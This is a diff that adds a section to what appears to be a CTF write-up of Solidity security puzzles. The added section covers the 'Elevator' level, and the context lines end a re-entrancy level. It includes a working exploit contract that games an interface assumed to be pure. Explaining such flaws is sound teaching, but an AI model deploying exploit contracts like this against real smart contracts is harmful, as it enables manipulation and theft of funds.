@@ -296,3 +296,35 @@ The target contract started off with 0.001 ether, so I just needed to start this
 > A lesson from this level: Transferring balance to contracts is dangerous, whether you use a limited-gas method or an unlimited-gas method.
 
 Something to note here is that `revert()` doesn't "bubble up" through a `call()` invocation. This is why I didn't have to be careful with terminating my re-entrancy loop the right way. At some point I would call `withdraw()` and it would fail and revert, but this wouldn't revert all of my sneaky work up to that point, just the execution of the deepest (failing) `withdraw()`.
+
+# Level 11: Elevator
+
+At first glance, I think this is going to be about the `pure` method modifier. We need to implement an interface, and we can break the assumptions of the victim contract if we implement a method impurely, because the victim contract assumes the method to be pure. In this sense, I use "pure" to mean that the same input will always produce the same output. In Solidity, `view` would also give the desired effect here, but `pure` is an even stronger property.
+
+> A lesson from this level: don't make assumptions about methods implemented in other contracts: "in an investigation, assumptions kill". Be as precise as you can with method modifiers.
+
+I deployed the following contract and invoked its `getToTopFloor()` method with the victim contract's address, and this completed the level.
+
+```
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity >=0.7.0 <0.9.0;
+
+contract ImpureBuilding {
+    bool private sayNoOnce = true;
+    function isLastFloor(uint256) external returns (bool) {
+        if (sayNoOnce) {
+            sayNoOnce = false;
+            return false;
+        }
+        return true;
+    }
+
+    function getToTopFloor(address elevator) external {
+        Elevator(elevator).goTo(1);
+    }
+}
+
+interface Elevator {
+  function goTo ( uint256 _floor ) external;
+}
+```
